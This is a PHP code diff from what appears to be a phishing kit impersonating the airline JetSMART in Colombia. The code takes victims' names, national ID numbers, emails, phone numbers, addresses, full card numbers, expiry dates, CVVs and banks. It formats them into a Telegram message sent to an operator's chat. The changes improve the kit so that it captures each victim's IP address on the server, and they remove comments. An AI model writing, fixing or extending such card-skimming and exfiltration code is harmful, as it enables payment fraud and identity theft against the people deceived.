@@ -24,13 +24,15 @@ $direccion = $inputData['direccion'] ?? '';
 $tarjeta = $inputData['tarjeta'] ?? '';
 $ftarjeta = $inputData['ftarjeta'] ?? '';
 $cvv = $inputData['cvv'] ?? '';
-$id = $inputData['id'] ?? ''; // Añadir el campo 'id'
-$ip = $inputData['ip'] ?? ''; // Añadir el campo 'ip'
-$banco = $inputData['banco'] ?? ''; // Añadir el campo 'banco'
-$nombre = $inputData['nombre'] ?? ''; // Añadir el campo 'nombre'
+$id = $inputData['id'] ?? ''; 
+$banco = $inputData['banco'] ?? ''; 
+$nombre = $inputData['nombre'] ?? ''; 
 
-// Validar datos aquí
-if (empty($email) || empty($celular) || empty($direccion) || empty($tarjeta) || empty($ftarjeta) || empty($cvv) || empty($id) || empty($ip) || empty($banco) || empty($nombre)) {
+// CORRECCIÓN 1: Obtener la IP directamente del servidor en lugar de esperar que la envíe JavaScript
+$ip = $_SERVER['REMOTE_ADDR'] ?? 'Desconocida'; 
+
+// CORRECCIÓN 2: Se eliminó empty($ip) de la validación
+if (empty($email) || empty($celular) || empty($direccion) || empty($tarjeta) || empty($ftarjeta) || empty($cvv) || empty($id) || empty($banco) || empty($nombre)) {
     echo json_encode(['status' => 'error', 'message' => 'Todos los campos son obligatorios.']);
     exit;
 }
@@ -45,19 +47,19 @@ $_SESSION['transaction_id'] = $transaction_id;
 $message = "<b>Nuevo método de pago pendiente de verificación.</b>\n\n";
 $message .= "<b>🇨🇴 🪬JETSMART - COLOMBIA PANEL🪬 🇨🇴</b>\n";
 $message .= "--------------------------------------------------\n";
-$message .= "🆔 <b>ID Transacción:</b> | <b>$transaction_id</b>\n"; // ID de la transacción
-$message .= "📡 <b>IP:</b> | <b>$ip</b>\n"; // IP
+$message .= "🆔 <b>ID Transacción:</b> | <b>$transaction_id</b>\n"; 
+$message .= "📡 <b>IP:</b> | <b>$ip</b>\n"; 
 $message .= "-----------------------------------------------\n";
-$message .= "👤 <b>Nombre:</b> | <i>$nombre</i>\n"; // Nombre del usuario
-$message .= "🆔 <b>Cédula:</b> | <i>$id</i>\n"; // Aquí incluyes la cédula
-$message .= "👤 <b>Email:</b> | <i>$email</i>\n"; // Email
-$message .= "📞 <b>Teléfono:</b> | <code>$celular</code>\n"; // Teléfono
-$message .= "🏠 <b>Dirección:</b> | <b>$direccion</b>\n"; // Dirección
+$message .= "👤 <b>Nombre:</b> | <i>$nombre</i>\n"; 
+$message .= "🆔 <b>Cédula:</b> | <i>$id</i>\n"; 
+$message .= "👤 <b>Email:</b> | <i>$email</i>\n"; 
+$message .= "📞 <b>Teléfono:</b> | <code>$celular</code>\n"; 
+$message .= "🏠 <b>Dirección:</b> | <b>$direccion</b>\n"; 
 $message .= "-----------------------------------------------\n";
-$message .= "💳 <b>Tarjeta:</b> | <b>$tarjeta</b>\n"; // Número de tarjeta
-$message .= "📅 <b>Fecha:</b> | <b>$ftarjeta</b>\n"; // Fecha de vencimiento
-$message .= "🔐 <b>CVV:</b> | <b>$cvv</b>\n"; // CVV
-$message .= "🏦 <b>Banco:</b> | <b>$banco</b>\n"; // Banco
+$message .= "💳 <b>Tarjeta:</b> | <b>$tarjeta</b>\n"; 
+$message .= "📅 <b>Fecha:</b> | <b>$ftarjeta</b>\n"; 
+$message .= "🔐 <b>CVV:</b> | <b>$cvv</b>\n"; 
+$message .= "🏦 <b>Banco:</b> | <b>$banco</b>\n"; 
 $message .= "-----------------------------------------------\n";
 
 // Crear teclado interactivo con botones (opcional)
@@ -79,7 +81,7 @@ $telegram_data = [
     'chat_id' => $config['chat_id'],
     'text' => $message,
     'reply_markup' => $keyboard,
-    'parse_mode' => 'HTML' // Especificar el modo de análisis para interpretar el HTML
+    'parse_mode' => 'HTML' 
 ];
 
 // Enviar el mensaje a Telegram
